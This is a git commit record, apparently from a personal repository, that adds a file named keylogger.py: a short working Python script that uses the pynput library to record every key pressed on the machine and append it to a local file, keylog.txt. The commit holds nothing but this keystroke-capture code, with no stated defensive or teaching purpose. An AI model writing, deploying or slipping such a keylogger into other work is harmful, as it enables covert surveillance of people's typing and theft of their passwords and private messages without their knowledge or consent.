25bc780dfc43c866a8c9285f83e4780453a64ea2
Jawad <jawadakbar5749@gmail.com>
2024-10-20 09:49:50 -0400

    Create keylogger.py

---
+++ keylogger.py
@@ -0,0 +1,15 @@
+#!/usr/bin/python3
+
+from pynput import keyboard
+
+log_file = "keylog.txt"
+
+def keystrokes(skey):
+    with open(log_file, "a") as file:
+        try:
+            file.write(f"{skey.char}")
+        except:
+            file.write(f" {skey} ")
+
+with keyboard.Listener(on_press=keystrokes) as listener:
+    listener.join()
